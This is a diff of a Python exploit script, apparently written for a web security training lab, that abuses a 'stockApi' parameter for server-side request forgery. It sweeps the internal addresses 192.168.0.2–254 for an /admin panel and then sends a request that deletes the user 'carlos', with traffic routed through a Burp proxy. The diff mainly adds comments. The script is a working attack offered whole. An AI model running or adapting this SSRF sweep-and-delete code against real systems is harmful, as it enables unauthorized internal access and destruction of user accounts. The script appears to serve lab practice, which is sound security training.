@@ -8,10 +8,11 @@ from colorama import init, Fore
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+#directing traffic to BurpSuite
 proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
 
 def ping_sweep(url):
-    
+    #Sweeping the internal network
     for i in range(2,255):
         ip_address='http://192.168.0.%s:8080/admin'%i
         parameter={'stockApi':ip_address}
@@ -28,14 +29,17 @@ def ping_sweep(url):
             
 
 def exploit(url,valid_ip):
+    #Exploiting the target
     print (Fore.BLUE+"[*] Deleting the user Carlos...")
+    
     stock_path ='/product/stock'
     exploit_payload = '/delete?username=carlos'
     exploit_parameter = {'stockApi':valid_ip+exploit_payload}
     exploit_request = requests.post(url+stock_path,data=exploit_parameter,verify=False,proxies=proxies)
+    
     print(Fore.GREEN+"[+] Exploit sent successfully!")
     
-    #Check if user got deleted
+    #Checking if user got deleted
     check_parameter = {'stockApi':valid_ip}
     check_request = requests.post(url+stock_path,data=check_parameter,verify=False,proxies=proxies)
     
@@ -45,13 +49,12 @@ def exploit(url,valid_ip):
         print(Fore.RED+"[!] The exploit failed!")
 
 
-
-
 @click.command()
 @click.option('-u','--url',type=str,required=True, prompt="The URL of the target",help="The URL of the vulnerable target")
 def main(url):
-    print(Fore.YELLOW+"[!] USE THE SCRIPT WITH BURP SUITE")
+    print(Fore.YELLOW+"[!] USE THE SCRIPT WITH BURPSUITE")
     print(Fore.BLUE+"[*] Sweeping the internal network...")
+    
     valid_ip = ping_sweep(url)
     exploit(url,valid_ip)
 
